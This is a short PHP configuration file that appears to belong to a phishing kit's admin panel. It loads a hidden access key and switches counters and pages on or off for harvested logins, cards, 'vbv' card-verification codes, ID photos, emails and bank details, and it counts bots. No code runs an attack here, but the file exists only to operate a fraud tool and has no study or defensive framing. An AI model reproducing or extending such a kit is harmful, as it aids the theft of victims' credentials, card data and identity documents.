<?php


$config['PRIVATE_KEY'] = @file_get_contents(__DIR__ . '/.access_key');


/** home statistic page  */
$config['STATISTIC_PANEL']['total_access']  = true;
$config['STATISTIC_PANEL']['count_visitor'] = true;
$config['STATISTIC_PANEL']['count_bot']     = true;
$config['STATISTIC_PANEL']['count_login']= true;
$config['STATISTIC_PANEL']['count_card']= false;
$config['STATISTIC_PANEL']['count_vbv']= false;
$config['STATISTIC_PANEL']['count_photo']= true;
$config['STATISTIC_PANEL']['count_email']= true;
$config['STATISTIC_PANEL']['count_bank'] = false;



/** config page on off */
$config['CONFIG_ONOFF']['page_email'] = false;
$config['CONFIG_ONOFF']['page_case'] = false;
$config['CONFIG_ONOFF']['page_photo'] = true;
$config['CONFIG_ONOFF']['page_bank'] = false;
$config['CONFIG_ONOFF']['page_vbv'] = false;

